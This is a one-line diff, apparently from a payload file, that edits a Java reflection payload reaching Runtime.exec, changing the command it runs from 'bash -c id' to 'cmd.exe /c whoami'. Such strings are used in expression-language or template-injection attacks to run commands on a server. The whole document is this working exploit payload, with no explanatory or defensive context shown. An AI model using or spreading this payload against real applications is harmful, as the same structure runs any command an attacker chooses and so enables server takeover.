@@ -1,1 +1,1 @@
-String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(new String[]{"/bin/bash","-c","id"},null,null).toString();
+String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(new String[]{"C:/Windows/System32/cmd.exe","/c","whoami"},null,null).toString();
